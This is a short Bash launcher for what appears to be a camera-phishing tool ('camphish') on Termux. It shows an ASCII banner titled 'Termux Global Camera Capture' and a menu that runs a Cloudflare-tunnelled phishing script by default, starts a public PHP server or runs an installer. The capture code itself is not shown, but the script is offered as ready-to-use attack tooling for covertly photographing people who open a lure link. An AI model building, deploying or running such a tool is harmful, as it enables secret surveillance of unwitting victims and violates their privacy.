#!/bin/bash
clear
cat << "EOF"
   _____           _    _          
  |  __ \         | |  | |         
  | |__) |   ___  | |__| |  _   _  
  |  ___/   / _ \ |  __  | | | | | 
  | |      | (_) || |  | | | |_| | 
  |_|       \___/ |_|  |_|  \__,_| 
        Termux Global Camera Capture
EOF

echo "1) 🌐 Cloudflare Global CDN (Recommended)"
echo "2) 📡 Local Test Server"
echo "3) 🧹 Install/Setup"
read -p "Choose [1]: " choice

case $choice in
    1) bash camphish-cloudflare.sh ;;
    2) php -S 0.0.0.0:8080 ;;
    3) bash install.sh ;;
    *) bash camphish-cloudflare.sh ;;
esac
